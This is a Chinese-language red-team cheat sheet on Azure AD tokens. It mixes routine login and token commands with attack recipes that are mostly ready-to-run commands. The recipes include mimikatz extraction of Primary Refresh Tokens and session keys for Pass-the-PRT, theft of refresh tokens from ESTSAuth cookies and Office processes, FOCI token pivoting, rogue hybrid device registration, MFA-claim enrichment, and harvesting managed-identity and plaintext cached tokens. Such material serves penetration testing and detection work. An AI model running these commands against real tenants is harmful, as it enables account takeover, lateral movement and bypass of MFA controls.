# Azure AD - 访问与令牌 (Access and Tokens)

## 连接 (Connection)

当你使用 PowerShell/CLI 对 Microsoft Graph API 进行身份验证时，你将使用来自微软租户的应用程序。

* [微软应用程序 ID (Microsoft Applications ID)](https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in)
* [Entra ID 第一方应用和范围浏览器 (Entra ID First Party Apps & Scope Browser)](https://entrascopes.com/)

| 名称 | 应用程序 ID (Application ID) |
|----------------------------|--------------------------------------|
| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |
| Microsoft Azure CLI        | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
| Azure 门户 (Portail Azure)              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |

身份验证成功后，你将获得一个访问令牌 (access token)。

### az cli

* 使用凭据登录 (Login with credentials)

    ```ps1
    az login -u <username> -p <password>
    az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
    ```

* 获取令牌 (Get token)

    ```ps1
    az account get-access-token
    az account get-access-token --resource-type aad-graph
    ```

相当于 Whoami 的命令：`az ad signed-in-user show`

### Azure AD Powershell

* 使用凭据登录 (Login with credentials)

    ```ps1
    $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
    Connect-AzureAD -Credential $creds
    ```

### Az Powershell

* 使用凭据登录 (Login with credentials)

    ```ps1
    $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>@<TENANT NAME>.onmicrosoft.com", $passwd)
    Connect-AzAccount -Credential $creds
    ```

* 使用服务主体机密登录 (Login with service principal secret)

    ```ps1
    $password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('<APP-ID>', $password)
    Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d
    ```

* 获取令牌 (Get token)

    ```ps1
    (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
    Get-AzAccessToken -ResourceTypeName MSGraph
    ```

### Microsoft Graph Powershell

* 使用凭据登录 (Login with credentials)

    ```ps1
    Connect-MgGraph
    Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All"
    ```

* 使用设备代码流登录 (Login with device code flow)

    ```ps1
    Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All" -UseDeviceAuthentication
    ```

相当于 Whoami 的命令：`Get-MgContext`

### 外部 HTTP API (External HTTP API)

* 使用凭据登录 (Login with credentials)

    ```ps1
    # 待办 (TODO)
    ```

#### 设备代码 (Device Code)

请求设备代码

```ps1
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

转到设备登录页面 [microsoft.com/devicelogin](https://login.microsoftonline.com/common/oauth2/deviceauth) 并输入设备代码。然后请求访问令牌。

```ps1
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```

#### 服务主体 (Service Principal)

* 使用**服务主体密码**请求访问令牌

    ```ps1
    curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'client_id=<client-id>' \
    --data-urlencode 'scope=https://graph.microsoft.com/.default' \
    --data-urlencode 'client_secret=<client-secret>' \
    --data-urlencode 'grant_type=client_credentials'
    ```

#### 应用机密 (App Secret)

应用机密（也称为客户端机密，client secret）是一个字符串，用于保护应用程序与 Azure Active Directory (Azure AD) 之间的通信。它是应用程序与其客户端 ID 一起使用的凭据，用于在代表用户或系统访问 Azure 资源（如 API 或其他服务）时证明其身份。

```ps1
$appid = '<app-id>'
$tenantid = '<tenant-id>'
$secret = '<app-secret>'
 
$body =  @{
    Grant_Type    = "client_credentials"
    Scope         = "https://graph.microsoft.com/.default"
    Client_Id     = $appid
    Client_Secret = $secret
}
 
$connection = Invoke-RestMethod `
    -Uri https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token `
    -Method POST `
    -Body $body

Connect-MgGraph -AccessToken $connection.access_token
```

### 内部 HTTP API (Internal HTTP API)

> **MSI_ENDPOINT** 是 **IDENTITY_ENDPOINT** 的别名，**MSI_SECRET** 是 **IDENTITY_HEADER** 的别名。

从环境变量中查找 `IDENTITY_HEADER` 和 `IDENTITY_ENDPOINT`：`env`

大多数情况下，你需要以下资源之一的令牌：

* <https://graph.microsoft.com>
* <https://management.azure.com>
* <https://storage.azure.com>
* <https://vault.azure.net>

* PowerShell

    ```ps1
    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
    ```

* Azure Function (Python)

    ```py
    import logging, os
    import azure.functions as func

    def main(req: func.HttpRequest) -> func.HttpResponse:
        logging.info('Python HTTP trigger function processed a request.')
        IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
        IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
        # 构建 curl 命令以获取管理资源的访问令牌
        cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
        val = os.popen(cmd).read()
        return func.HttpResponse(val, status_code=200)
    ```

## 访问令牌 (Access Token)

访问令牌是 Azure Active Directory (Azure AD) 发行的一种安全令牌，用于授予用户或应用程序访问资源的权限。这些资源可以是任何内容，从 API、Web 应用程序、Azure 中存储的数据到集成 Azure AD 进行身份验证和授权的其他服务。

解码访问令牌：[jwt.ms](https://jwt.ms/)

* 将访问令牌用于 **MgGraph**

    ```ps1
    # 使用 JWT
    $token = "eyJ0eXAiO..."
    $secure = $token | ConvertTo-SecureString -AsPlainText -Force
    Connect-MgGraph -AccessToken $secure
    ```

* 将访问令牌用于 **AzureAD**

    ```powershell
    Connect-AzureAD -AadAccessToken <access-token> -TenantId <tenant-id> -AccountId <account-id>
    ```

* 将访问令牌用于 **Az Powershell**

    ```powershell
    Connect-AzAccount -AccessToken <access-token> -AccountId <account-id>
    Connect-AzAccount -AccessToken <access-token> -GraphAccessToken <graph-access-token> -AccountId <account-id>
    ```

* 将访问令牌用于 **API**

    ```powershell
    $Token = 'eyJ0eX..'
    $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
    # $URI = 'https://graph.microsoft.com/v1.0/applications'
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $Token"
        }
    }
    (Invoke-RestMethod @RequestParams).value 
    ```

### 访问令牌存储位置 (Access Token Locations)

如果你使用 **Azure Cloud Shell**，令牌默认存储在磁盘上。可以通过转储存储帐户的内容来提取它们。

* az cli
    * az cli 将访问令牌以明文形式存储在 `C:\Users\<username>\.Azure` 目录下的 **accessTokens.json** 中。
    * 同一目录下的 azureProfile.json 包含有关订阅的信息。

* Az PowerShell
    * Az PowerShell 将访问令牌以明文形式存储在 `C:\Users\<username>\.Azure` 目录下的 **TokenCache.dat** 中。
    * 它还将核心**服务主体机密 (ServicePrincipalSecret)** 以明文形式存储在 **AzureRmContext.json** 中。
    * 用户可以使用 `Save-AzContext` 保存令牌。

## 刷新令牌 (Refresh Token)

* 使用凭据请求令牌

    ```ps1
    # 待办 (TODO)
    ```

### 从 ESTSAuth Cookie 获取刷新令牌 (Get a Refresh Token from ESTSAuth Cookie)

`ESTSAuthPersistent` 仅在条件访问策略 (CA policy) 实际授予持久会话时才有用。否则，应使用 `ESTSAuth`。

```ps1
TokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie "0.AS8"
TokenTacticsV2> Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
```

### 从 Office 进程获取刷新令牌 (Get a Refresh Token from Office process)

* [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)

```ps1
load bofloader
execute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324
```

## FOCI 刷新令牌 (FOCI Refresh Token)

客户端 ID 家族 (Family of client ids, FOCI) 允许向 Azure AD 注册的应用程序共享令牌，从而在用户访问属于同一“家族”的多个应用程序时减少单独进行身份验证的需要。

* [secureworks/family-of-client-ids-research/](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) - 对 Azure AD 刷新令牌未记录行为的研究

**生成令牌**

```ps1
roadtx gettokens --refresh-token <refresh-token> -c <foci-id> -r https://graph.microsoft.com 
roadtx gettokens --refresh-token <refresh-token> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46
```

```ps1
范围 (scope)         资源 (resource)                         客户端 (client)                              
.default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2
                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://graph.windows.net               00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
Files.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c    d3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264
Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2
```

## 主刷新令牌 (Primary Refresh Token / PRT)

主刷新令牌 (PRT) 是微软 Azure AD (Azure Active Directory) 环境中身份验证和身份管理过程中的关键部分。PRT 主要用于在设备上维持无缝的登录体验。

:warning: PRT 的有效期为 90 天，并且只要设备在使用中就会不断续期。但是，如果设备不处于使用状态，其有效期仅为 14 天。

* 使用 PRT 令牌

    ```ps1
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
    roadtx browserprtauth --prt roadtx.prt -url http://www.office.com
    ```

### 提取 PRT v1 - 传递 PRT (Pass-the-PRT)

MimiKatz (2.2.0 及以上版本) 可用于攻击 (混合) Azure AD 加入的机器，通过用于 Azure AD SSO (单点登录) 的主刷新令牌 (PRT) 进行横向移动攻击。

* 使用 mimikatz 提取 PRT 和会话密钥 (session key)

    ```ps1
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::cloudap
    mimikatz # sekurlsa::dpapi
    mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
    mimikatz # dpapi::cloudapkd /context:<context> /derivedkey:<derived-key> /Prt:<prt>
    ```

* 使用 roadtx 或 AADInternals 生成新的 PRT 令牌

    ```ps1
    roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com

    PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
    PS AADInternals> $PRT_OF_USER = '...'
    PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
    PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
    PS AADInternals> $ClearKey = "XXYYZZ..."
    PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
    PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
    ```

### 在带有 TPM 的设备上提取 PRT (Extract PRT on Device with TPM)

* 目前尚无已知方法。

### 使用刷新流请求 PRT (Request a PRT using the Refresh Flow)

* 向 AAD 请求 nonce：`roadrecon auth --prt-init -t <tenant-id>`
* 使用 [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) 或 [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) 发起新的 PRT 请求。
* `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` 或 `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
* 然后使用 cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>` 浏览至 [login.microsoftonline.com](https://login.microsoftonline.com)

    ```powershell
    Name: x-ms-RefreshTokenCredential
    Value: <Signed JWT>
    HttpOnly: √
    ```

:warning: 请使用 `HTTPOnly` 和 `Secure` 标志标记 cookie。

### 使用混合架构设备请求 PRT (Request a PRT with Hybrid Device)

Requirements (要求)：

* ADDS 用户凭据
* 混合环境 (ADDS 和 Azure AD)

使用用户帐户创建计算机并请求 PRT

* 在 AD 中创建计算机帐户：`impacket-addcomputer <domain>/<username>:<password> -dc-ip <dc-ip>`
* 使用 [dirkjanm/roadtools_hybrid](https://github.com/dirkjanm/roadtools_hybrid) 在 AD 中配置计算机证书：`python setcert.py 10.10.10.10  -t '<machine-account$>' -u '<domain>\<machine-account$>' -p <machine-password>`
* 使用此证书在 Azure AD 中注册混合架构设备：`roadtx hybriddevice -c '<machine-account>.pem' -k '<machine-account>.key' --sid '<device-sid>' -t '<aad-tenant-id>'`
* 获取带有设备声明 (device claim) 的 PRT

    ```ps1
    roadtx prt -c <hybrid-device-name>.pem -k <hybrid-device-name>.key -u <username>@h<domain> -p <password>
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
    ```

### 将刷新令牌升级为 PRT (Upgrade Refresh Token to PRT)

* 获取正确的令牌受众 (token audience)：`roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file`
* 注册设备：`roadtx device -a register -n <device-name>`
* 请求 PRT：`roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key`
* 使用 PRT：`roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com`

### 使用 MFA 声明丰富 PRT (Enriching a PRT with MFA claim)

* 请求特殊的刷新令牌：`roadtx prtenrich -u username@domain`
* 请求带有 MFA 声明的 PRT：`roadtx prt -r <refreshtoken> -c <device>.pem -k <device>.key`

## 参考资料 (References)

* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema - April 16, 2020](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
* [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
* [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)
* [PRT Abuse from Userland with Cobalt Strike - 0xbad53c](https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)
* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert - AADInternals.com - September 01, 2020](https://aadinternals.com/post/prt/)
* [Get Access Tokens for Managed Service Identity on Azure App Service](https://zhiliaxu.github.io/app-service-managed-identity.html)
* [Attacking Azure Cloud shell - Karl Fosaaen - December 10, 2019](https://blog.netspi.com/attacking-azure-cloud-shell/)
* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)
* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/)
* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://www.lares.com/hunting-azure-admins-for-vertical-escalation/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
* [Understanding Tokens in Entra ID: A Comprehensive Guide - Lina Lau - September 18, 2024](https://www.xintra.org/blog/tokens-in-entra-id-guide)
